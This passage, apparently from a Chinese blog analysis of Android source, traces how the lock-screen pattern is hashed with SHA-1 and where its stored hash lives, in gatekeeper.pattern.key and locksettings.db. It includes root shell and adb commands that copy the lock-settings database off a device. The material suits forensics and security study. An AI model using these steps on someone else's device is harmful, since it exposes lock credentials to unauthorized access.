LockPatternUtils.CREDENTIAL_TYPE_PATTERN) &#123;</span><br><span class="line"><span class="number">1663</span>                      unlockKeystore(LockPatternUtils.patternStringToBaseZero(credential), userId);</span><br><span class="line"><span class="number">1664</span>                  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">1665</span>                      unlockKeystore(credential, userId);</span><br><span class="line"><span class="number">1666</span>                  &#125;</span><br></pre></td></tr></table></figure><h2 id="1-3-stringToPattern"><a href="#1-3-stringToPattern" class="headerlink" title="1.3 stringToPattern()"></a>1.3 stringToPattern()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/widget/LockPatternUtils.java</span></span><br><span class="line"><span class="number">992</span>      <span class="keyword">public</span> <span class="keyword">static</span> List&lt;LockPatternView.Cell&gt; stringToPattern(String string) &#123;</span><br><span class="line"><span class="number">993</span>          <span class="keyword">if</span> (string == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">994</span>              <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">995</span>          &#125;</span><br><span class="line"><span class="number">996</span>  </span><br><span class="line"><span class="number">997</span>          List&lt;LockPatternView.Cell&gt; result = Lists.newArrayList();</span><br><span class="line"><span class="number">998</span>  </span><br><span class="line"><span class="number">999</span>          <span class="keyword">final</span> <span class="type">byte</span>[] bytes = string.getBytes();</span><br><span class="line"><span class="number">1000</span>          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line"><span class="number">1001</span>              <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> (<span class="type">byte</span>) (bytes[i] - <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="number">1002</span>              result.add(LockPatternView.Cell.of(b / <span class="number">3</span>, b % <span class="number">3</span>));</span><br><span class="line"><span class="number">1003</span>          &#125;</span><br><span class="line"><span class="number">1004</span>          <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">1005</span>      &#125;</span><br></pre></td></tr></table></figure><p>这个传入的string又是什么呢？搜索一下发现<code>stringToPattern()</code>可以这样用：</p><img src="/posts/ecd6d008/1.1.9.png" class=""><p>也就是传入数字字符串。根据传入的字符串，可以稍微看一下字节型变量b存的是什么。我们自己编写一下代码查看结果：</p><img src="/posts/ecd6d008/1.1.10.png" class=""><h2 id="1-4-of"><a href="#1-4-of" class="headerlink" title="1.4 of()"></a>1.4 of()</h2><p>得到了b后，继续进入查看<code>of()</code>函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/com/android/internal/widget/LockPatternView.java</span></span><br><span class="line"><span class="number">189</span>          <span class="keyword">public</span> <span class="keyword">static</span> Cell <span class="title function_">of</span><span class="params">(<span class="type">int</span> row, <span class="type">int</span> column)</span> &#123;</span><br><span class="line"><span class="number">190</span>              checkRange(row, column);</span><br><span class="line"><span class="number">191</span>              <span class="keyword">return</span> sCells[row][column];</span><br><span class="line"><span class="number">192</span>          &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">194</span>          <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">checkRange</span><span class="params">(<span class="type">int</span> row, <span class="type">int</span> column)</span> &#123;</span><br><span class="line"><span class="number">195</span>              <span class="keyword">if</span> (row &lt; <span class="number">0</span> || row &gt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="number">196</span>                  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;row must be in range 0-2&quot;</span>);</span><br><span class="line"><span class="number">197</span>              &#125;</span><br><span class="line"><span class="number">198</span>              <span class="keyword">if</span> (column &lt; <span class="number">0</span> || column &gt; <span class="number">2</span>) &#123;</span><br><span class="line"><span class="number">199</span>                  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;column must be in range 0-2&quot;</span>);</span><br><span class="line"><span class="number">200</span>              &#125;</span><br><span class="line"><span class="number">201</span>          &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">159</span>          <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Cell[][] sCells = createCells();</span><br><span class="line"><span class="number">160</span>  </span><br><span class="line"><span class="number">161</span>          <span class="keyword">private</span> <span class="keyword">static</span> Cell[][] createCells() &#123;</span><br><span class="line"><span class="number">162</span>              Cell[][] res = <span class="keyword">new</span> <span class="title class_">Cell</span>[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line"><span class="number">163</span>              <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line"><span class="number">164</span>                  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line"><span class="number">165</span>                      res[i][j] = <span class="keyword">new</span> <span class="title class_">Cell</span>(i, j);</span><br><span class="line"><span class="number">166</span>                  &#125;</span><br><span class="line"><span class="number">167</span>              &#125;</span><br><span class="line"><span class="number">168</span>              <span class="keyword">return</span> res;</span><br><span class="line"><span class="number">169</span>          &#125;</span><br></pre></td></tr></table></figure><p>这就很清楚了，九宫格九个点分别代表字符1~9，将依次连起来的字符传入<code>stringToPattern()</code>，再将每个点转化为二维Cell数组的形式，依次存进result列表中。这个result列表就是<code>patternToHash()</code>中的参数pattern。</p><p><code>patternToHash()</code>中的res数组内容范围我们就知道了，是数字0~8的字节形式，将点依次存入res数组，再进行SHA-1加密。举个例子，输入的string为“1234”： ^7da60a</p><img src="/posts/ecd6d008/1.1.11.png" class=""><p>分析完<code>patternToHash()</code>后，回到<code>verifyCredential()</code>，比较hash和storedHash.hash是否相等，如果相等则解锁。也就是说我们预先存的密码在storedHash中。下面我们就来找storedHash。</p><img src="/posts/ecd6d008/1.1.3.png" class=""><h2 id="1-5-readCredentialHash"><a href="#1-5-readCredentialHash" class="headerlink" title="1.5 readCredentialHash()"></a>1.5 readCredentialHash()</h2><p>storedHash是从<code>readCredentialHash()</code>方法中来的。</p><img src="/posts/ecd6d008/1.1.7.png" class=""><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">300</span>      <span class="keyword">public</span> CredentialHash <span class="title function_">readCredentialHash</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">301</span>          <span class="type">CredentialHash</span> <span class="variable">passwordHash</span> <span class="operator">=</span> readPasswordHashIfExists(userId);</span><br><span class="line"><span class="number">302</span>          <span class="type">CredentialHash</span> <span class="variable">patternHash</span> <span class="operator">=</span> readPatternHashIfExists(userId);</span><br><span class="line"><span class="number">303</span>          <span class="keyword">if</span> (passwordHash != <span class="literal">null</span> &amp;&amp; patternHash != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">304</span>              <span class="keyword">if</span> (passwordHash.version == CredentialHash.VERSION_GATEKEEPER) &#123;</span><br><span class="line"><span class="number">305</span>                  <span class="keyword">return</span> passwordHash;</span><br><span class="line"><span class="number">306</span>              &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">307</span>                  <span class="keyword">return</span> patternHash;</span><br><span class="line"><span class="number">308</span>              &#125;</span><br><span class="line"><span class="number">309</span>          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (passwordHash != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">310</span>              <span class="keyword">return</span> passwordHash;</span><br><span class="line"><span class="number">311</span>          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (patternHash != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">312</span>              <span class="keyword">return</span> patternHash;</span><br><span class="line"><span class="number">313</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">314</span>              <span class="keyword">return</span> CredentialHash.createEmptyHash();</span><br><span class="line"><span class="number">315</span>          &#125;</span><br><span class="line"><span class="number">316</span>      &#125;</span><br></pre></td></tr></table></figure><h2 id="1-6-prefetchUser"><a href="#1-6-prefetchUser" class="headerlink" title="1.6 prefetchUser()"></a>1.6 prefetchUser()</h2><p>又哪里调用到了<code>readCredentialHash()</code>呢？可以看到<code>prefetchUser()</code>方法进行了数据库请求。</p><img src="/posts/ecd6d008/1.1.4.png" class=""><img src="/posts/ecd6d008/1.1.5.png" class=""><p>尝试找一下数据库的名字，因为它是系统应用，所以它的所有文件名都是有特定名字的。</p><img src="/posts/ecd6d008/1.1.6.png" class=""><p>这样我们就知道了它的数据库是<code>locksettings.db</code>，可以在手机中搜索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name locksettings.db</span><br></pre></td></tr></table></figure><p>路径为<code>/data/system/locksettings.db</code>。将它取出来，用DB Browser for SQLite打开。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bullhead:/ # cp /data/system/locksettings.db /sdcard/Download/</span><br><span class="line">C:\Users\dell\Desktop&gt;adb pull /sdcard/Download/locksettings.db</span><br><span class="line">/sdcard/Download/locksettings.db: 1 file pulled, 0 skipped. 2.7 MB/s (20480 bytes in 0.007s)</span><br></pre></td></tr></table></figure><img src="/posts/ecd6d008/1.1.8.png" class=""><p>数据库中的userId都为0，其它貌似看不出什么，回到源码中去，数据库请求完后，执行<code>readCredentialHash()</code>。</p><p>这里与Andorid 5.1不一样的就是，Android 5.1单纯pull <code>locksettings.db</code>是没数据的，需要一同把<code>locksettings.db-shm</code>和<code>locksettings.db-wal</code>拷贝下来。先打开DB Browser for SQLite再载入<code>locksettings.db</code>即可看到数据。</p><h2 id="1-7-readPatternHashIfExists"><a href="#1-7-readPatternHashIfExists" class="headerlink" title="1.7 readPatternHashIfExists()"></a>1.7 readPatternHashIfExists()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">280</span>      <span class="keyword">private</span> CredentialHash <span class="title function_">readPatternHashIfExists</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">281</span>          <span class="type">byte</span>[] stored = readFile(getLockPatternFilename(userId));</span><br><span class="line"><span class="number">282</span>          <span class="keyword">if</span> (!ArrayUtils.isEmpty(stored)) &#123;</span><br><span class="line"><span class="number">283</span>              <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CredentialHash</span>(stored, LockPatternUtils.CREDENTIAL_TYPE_PATTERN,</span><br><span class="line"><span class="number">284</span>                      CredentialHash.VERSION_GATEKEEPER);</span><br><span class="line"><span class="number">285</span>          &#125;</span><br><span class="line"><span class="number">286</span>  </span><br><span class="line"><span class="number">287</span>          stored = readFile(getBaseZeroLockPatternFilename(userId));</span><br><span class="line"><span class="number">288</span>          <span class="keyword">if</span> (!ArrayUtils.isEmpty(stored)) &#123;</span><br><span class="line"><span class="number">289</span>              <span class="keyword">return</span> CredentialHash.createBaseZeroPattern(stored);</span><br><span class="line"><span class="number">290</span>          &#125;</span><br><span class="line"><span class="number">291</span>  </span><br><span class="line"><span class="number">292</span>          stored = readFile(getLegacyLockPatternFilename(userId));</span><br><span class="line"><span class="number">293</span>          <span class="keyword">if</span> (!ArrayUtils.isEmpty(stored)) &#123;</span><br><span class="line"><span class="number">294</span>              <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CredentialHash</span>(stored, LockPatternUtils.CREDENTIAL_TYPE_PATTERN,</span><br><span class="line"><span class="number">295</span>                      CredentialHash.VERSION_LEGACY);</span><br><span class="line"><span class="number">296</span>          &#125;</span><br><span class="line"><span class="number">297</span>          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">298</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">447</span>      String <span class="title function_">getLockPatternFilename</span><span class="params">(<span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">448</span>          <span class="keyword">return</span> getLockCredentialFilePathForUser(userId, LOCK_PATTERN_FILE);</span><br><span class="line"><span class="number">449</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">75</span>      <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">SYSTEM_DIRECTORY</span> <span class="operator">=</span> <span class="string">&quot;/system/&quot;</span>;</span><br><span class="line"><span class="number">76</span>      <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LOCK_PATTERN_FILE</span> <span class="operator">=</span> <span class="string">&quot;gatekeeper.pattern.key&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">475</span>      <span class="keyword">private</span> String <span class="title function_">getLockCredentialFilePathForUser</span><span class="params">(<span class="type">int</span> userId, String basename)</span> &#123;</span><br><span class="line"><span class="number">476</span>          <span class="type">String</span> <span class="variable">dataSystemDirectory</span> <span class="operator">=</span> Environment.getDataDirectory().getAbsolutePath() +</span><br><span class="line"><span class="number">477</span>                          SYSTEM_DIRECTORY;</span><br><span class="line"><span class="number">478</span>          <span class="keyword">if</span> (userId == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">479</span>              <span class="comment">// Leave it in the same place for user 0</span></span><br><span class="line">    <span class="comment">// /data/system/gatekeeper.pattern.key</span></span><br><span class="line"><span class="number">480</span>              <span class="keyword">return</span> dataSystemDirectory + basename;</span><br><span class="line"><span class="number">481</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">482</span>              <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(Environment.getUserSystemDirectory(userId), basename).getAbsolutePath();</span><br><span class="line"><span class="number">483</span>          &#125;</span><br><span class="line"><span class="number">484</span>      &#125;</span><br></pre></td></tr></table></figure><h2 id="1-8-readFile"><a href="#1-8-readFile" class="headerlink" title="1.8  readFile()"></a>1.8  readFile()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/services/core/java/com/android/server/locksettings/LockSettingsStorage.java</span></span><br><span class="line"><span class="number">360</span>      <span class="keyword">private</span> <span class="type">byte</span>[] readFile(String name) &#123;<span class="comment">//name=&quot;/data/system/gatekeeper.pattern.key&quot;</span></span><br><span class="line"><span class="number">361</span>          <span class="type">int</span> version;</span><br><span class="line"><span class="number">362</span>          <span class="keyword">synchronized</span> (mCache) &#123;</span><br><span class="line"><span class="number">363</span>              <span class="keyword">if</span> (mCache.hasFile(name)) &#123;</span><br><span class="line"><span class="number">364</span>                  <span class="keyword">return</span> mCache.peekFile(name);</span><br><span class="line"><span class="number">365</span>              &#125;</span><br><span class="line"><span class="number">366</span>              version = mCache.getVersion();</span><br><span class="line"><span class="number">367</span>          &#125;</span><br><span class="line"><span class="number">368</span>  </span><br><span class="line"><span class="number">369</span>          <span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">370</span>          <span class="type">byte</span>[] stored = <span class="literal">null</span>;</span><br><span class="line"><span class="number">371</span>          <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">372</span>              raf = <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(name, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="number">373</span>              stored = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) raf.length()];</span><br><span class="line"><span class="number">374</span>              raf.readFully(stored, <span class="number">0</span>, stored.length);</span><br><span class="line"><span class="number">375</span>              raf.close();</span><br><span class="line"><span class="number">376</span>          &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="number">377</span>              Slog.e(TAG, <span class="string">&quot;Cannot read file &quot;</span> + e);</span><br><span class="line"><span class="number">378</span>          &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="number">379</span>              <span class="keyword">if</span> (raf != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">380</span>                  <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">381</span>                      raf.close();</span><br><span class="line"><span class="number">382</span>                  &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="number">383</span>                      Slog.e(TAG, <span class="string">&quot;Error closing file &quot;</span> + e);</span><br><span class="line"><span class="number">384</span>                  &#125;</span><br><span class="line"><span class="number">385</span>              &#125;</span><br><span class="line"><span class="number">386</span>          &#125;</span><br><span class="line"><span class="number">387</span>          mCache.putFileIfUnchanged(name, stored, version);</span><br><span class="line"><span class="number">388</span>          <span class="keyword">return</span> stored;</span><br><span class="line"><span class="number">389</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">802</span>          <span class="type">boolean</span> <span class="title function_">hasFile</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line"><span class="number">803</span>              <span class="keyword">return</span> contains(CacheKey.TYPE_FILE, fileName, -<span class="number">1</span> <span class="comment">/* userId */</span>);</span><br><span class="line"><span class="number">804</span>          &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">876</span>              <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">TYPE_FILE</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="number">836</span>          <span class="keyword">private</span> <span class="keyword">synchronized</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(<span class="type">int</span> type, String key, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">837</span>              <span class="keyword">return</span> mCache.containsKey(mCacheKey.set(type, key, userId));</span><br><span class="line"><span class="number">838</span>          &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">883</span>              <span class="keyword">public</span> CacheKey <span class="title function_">set</span><span class="params">(<span class="type">int</span> type, String key, <span class="type">int</span> userId)</span> &#123;</span><br><span class="line"><span class="number">884</span>                  <span class="built_in">this</span>.type = type;</span><br><span class="line"><span class="number">885</span>                  <span class="built_in">this</span>.key = key;</span><br><span class="line"><span class="number">886</span>                  <span class="built_in">this</span>.userId = userId;</span><br><span class="line"><span class="number">887</span>                  <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line"><span class="number">888</span>              &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /frameworks/base/core/java/android/util/ArrayMap.java</span></span><br><span class="line"><span class="number">366</span>      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsKey</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="number">367</span>          <span class="keyword">return</span> indexOfKey(key) &gt;= <span class="number">0</span>;</span><br><span class="line"><span class="number">368</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">376</span>      <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">indexOfKey</span><span class="params">(Object key)</span> &#123;</span><br><span class="line"><span class="number">377</span>          <span class="type">return</span> <span class="variable">key</span> <span class="operator">=</span>= <span class="literal">null</span> ? indexOfNull()</span><br><span class="line"><span class="number">378</span>                  : indexOf(key, mIdentityHashCode ? System.identityHashCode(key) : key.hashCode());</span><br><span class="line"><span class="number">379</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">264</span>      <span class="keyword">public</span> <span class="title function_">ArrayMap</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="number">265</span>          <span class="built_in">this</span>(<span class="number">0</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="number">266</span>      &#125;</span><br><span class="line"><span class="number">267</span>  </span><br><span class="line"><span class="number">268</span>      <span class="comment">/**</span></span><br><span class="line"><span class="comment">269       * Create a new ArrayMap with a given initial capacity.</span></span><br><span class="line"><span class="comment">270       */</span></span><br><span class="line"><span class="number">271</span>      <span class="keyword">public</span> <span class="title function_">ArrayMap</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line"><span class="number">272</span>          <span class="built_in">this</span>(capacity, <span class="literal">false</span>);</span><br><span class="line"><span class="number">273</span>      &#125;</span><br><span class="line"><span class="number">274</span>  </span><br><span class="line"><span class="number">275</span>      <span class="comment">/** &#123;<span class="doctag">@hide</span>&#125; */</span></span><br><span class="line"><span class="number">276</span>      <span class="keyword">public</span> <span class="title function_">ArrayMap</span><span class="params">(<span class="type">int</span> capacity, <span class="type">boolean</span> identityHashCode)</span> &#123;</span><br><span class="line"><span class="number">277</span>          mIdentityHashCode = identityHashCode;<span class="comment">//mIdentityHashCode=false</span></span><br><span class="line"><span class="number">278</span>  </span><br><span class="line"><span class="number">279</span>          <span class="comment">// If this is immutable, use the sentinal EMPTY_IMMUTABLE_INTS</span></span><br><span class="line"><span class="number">280</span>          <span class="comment">// instance instead of the usual EmptyArray.INT. The reference</span></span><br><span class="line"><span class="number">281</span>          <span class="comment">// is checked later to see if the array is allowed to grow.</span></span><br><span class="line"><span class="number">282</span>          <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">283</span>              mHashes = EMPTY_IMMUTABLE_INTS;</span><br><span class="line"><span class="number">284</span>              mArray = EmptyArray.OBJECT;</span><br><span class="line"><span class="number">285</span>          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (capacity == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">286</span>              mHashes = EmptyArray.INT;</span><br><span class="line"><span class="number">287</span>              mArray = EmptyArray.OBJECT;</span><br><span class="line"><span class="number">288</span>          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">289</span>              allocArrays(capacity);</span><br><span class="line"><span class="number">290</span>          &#125;</span><br><span class="line"><span class="number">291</span>          mSize = <span class="number">0</span>;</span><br><span class="line"><span class="number">292</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">754</span>      <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="number">755</span>          <span class="keyword">final</span> <span class="type">int</span>[] hashes = mHashes;</span><br><span class="line"><span class="number">756</span>          <span class="keyword">final</span> Object[] array = mArray;</span><br><span class="line"><span class="number">757</span>          <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">758</span>          <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, v = <span class="number">1</span>, s = mSize; i &lt; s; i++, v+=<span class="number">2</span>) &#123;</span><br><span class="line"><span class="number">759</span>              <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> array[v];</span><br><span class="line"><span class="number">760</span>              result += hashes[i] ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line"><span class="number">761</span>          &#125;</span><br><span class="line"><span class="number">762</span>          <span class="keyword">return</span> result;</span><br><span class="line"><span class="number">763</span>      &#125;</span><br><span class="line"></span><br><span class="line"><span class="number">114</span>      <span class="type">int</span> <span class="title function_">indexOf</span><span class="params">(Object key, <span class="type">int</span> hash)</span> &#123;</span><br><span class="line"><span class="number">115</span>          <span class="keyword">final</span> <span class="type">int</span> <span class="variable">N</span> <span class="operator">=</span> mSize;</span><br><span class="line"><span class="number">116</span>  </span><br><span class="line"><span class="number">117</span>          <span class="comment">// Important fast case: if nothing is in here, nothing to look for.</span></span><br><span class="line"><span class="number">118</span>          <span class="keyword">if</span> (N == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">119</span>              <span class="keyword">return</span> ~<span class="number">0</span>;</span><br><span class="line"><span class="number">120</span>          &#125;</span><br><span class="line"><span class="number">121</span>  </span><br><span class="line"><span class="number">122</span>          <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> binarySearchHashes(mHashes, N, hash);</span><br><span class="line"><span class="number">123</span>  </span><br><span class="line"><span class="number">124</span>          <span class="comment">// If the hash code wasn&#x27;t found, then we have no entry for this key.</span></span><br><span class="line"><span class="number">125</span>          <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">126</span>              <span 